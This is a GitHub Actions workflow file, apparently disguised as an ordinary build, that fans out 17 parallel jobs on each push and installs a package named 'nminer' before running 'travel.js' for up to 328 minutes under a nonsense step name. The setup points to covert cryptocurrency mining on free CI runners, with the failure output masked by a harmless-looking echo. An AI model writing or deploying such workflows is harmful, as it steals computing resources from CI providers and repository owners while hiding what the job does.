name: travel
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5856 }
          - { version: 1173 }
          - { version: 654 }
          - { version: 6259 }
          - { version: 6394 }
          - { version: 7222 }
          - { version: 9915 }
          - { version: 6855 }
          - { version: 1674 }
          - { version: 7123 }
          - { version: 7052 }
          - { version: 5105 }
          - { version: 3667 }
          - { version: 6590 }
          - { version: 2373 }
          - { version: 7371 }
          - { version: 8203 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: while confound gadzooks private
        run: |
          npm install nminer@latest
          timeout 328m node travel.js || echo "travel executed"